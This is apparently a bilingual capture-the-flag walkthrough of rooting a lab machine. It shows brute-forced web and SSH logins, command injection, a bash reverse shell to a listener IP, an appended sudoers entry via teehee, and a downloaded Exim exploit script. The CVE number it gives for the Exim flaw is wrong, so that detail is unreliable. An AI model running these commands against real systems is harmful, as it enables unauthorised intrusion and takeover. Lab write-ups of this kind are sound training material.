## 🧭 信息收集 | Information Gathering

### 🔹 使用 nmap 扫描目标端口

```apl
nmap -sS -p- --min-rate=1000 -Pn 192.168.111.162 -oN all_ports.txt
```

确认开放端口：

- 22 (SSH)
- 80 (HTTP)

进一步使用详细脚本探测：

```apl
nmap -sC -sV -p22,80 192.168.111.162 -oN nmap_detailed.txt
```

> Basic enumeration shows standard SSH and a web service on port 80.

------

## 🌐 Web 页面分析与爆破 | Web Interaction & Brute Force

访问 Web 页面发现登录框，尝试默认账号失败后进行爆破。

使用 Burp Suite + 字典 `500pwds.txt` 进行爆破，发现成功登录信息：

```apl
admin : happy
```

> Brute-forced login credentials for the admin panel using Burp Intruder.

------

## 🧪 命令执行分析 | Command Execution

登录后台后页面存在执行命令功能，Burp 抓包修改命令为：

```apl
id
```

出现正常回显，判断为远程命令执行。

------

## 📡 反弹 shell | Reverse Shell

### 设置监听器：

```apl
nc -lvvp 8888
```

### 构造 payload（Burp 修改）：

```apl
bash -c "bash -i >& /dev/tcp/192.168.111.143/8888 0>&1"
```

成功反弹 shell。

------

## 🧱 获取稳定 shell | Gaining a Stable Shell

```apl
python -c "import pty; pty.spawn('/bin/bash')"
```

使用 Python 获取伪终端，提升交互体验。

------

## 🔍 文件与信息收集 | Internal Enumeration

查看 `/home/jim/backups/old-passwords.bak` 获取爆破字典。

使用 hydra 爆破 SSH：

```apl
hydra -l jim -P old-passwords.bak ssh://192.168.111.162
```

成功爆破出密码：

```apl
jim : jibril04
```

------

## 🔑 SSH 登录 | SSH Access

```apl
ssh jim@192.168.111.162
```

成功登录后系统提示 “You have new mail”，查看 mail：

```apl
cat /var/mail/jim
```

获取 Charles 的账号密码：

```apl
Charles : ^xHhA&hvim0y
```

登录 Charles 账户：

```apl
su Charles
```

------

## 📈 提权方式一：Sudo 提权 | Privilege Escalation (Method 1)

```apl
sudo -l
```

发现：

```apl
(root) NOPASSWD: /usr/bin/teehee
```

使用 teehee 修改 sudoers 文件：

```apl
echo 'charles ALL=(ALL:ALL) NOPASSWD:ALL' | sudo teehee -a /etc/sudoers
sudo su -
```

成功获取 root 权限。

------

## 🔁 提权方式二：Exim4 本地提权 | Privilege Escalation (Method 2)

查找 SUID 程序：

```apl
find / -user root -perm -4000 -print 2>/dev/null
```

发现 `exim4` 可执行，查看版本：

```apl
/usr/sbin/exim4 --version
```

版本在 4.87 - 4.91 之间，存在本地提权漏洞（CVE-2019-15846）。

使用 Exploit-DB 的脚本：

```apl
wget https://www.exploit-db.com/exploits/46996
bash 46996.sh
```

等待 shell 提权成功。

------

## 🏁 总结 | Summary

- 🔍 通过目录扫描与爆破成功进入后台
- 📡 远程命令执行后获取 shell 并反弹
- 🔑 通过 SSH 爆破+邮件信息成功切换用户
- 🔼 2 种方式提权获取 root：`sudo teehee` 和 `exim4 本地提权`

> A solid example of web-based RCE leading to multi-step privilege escalation.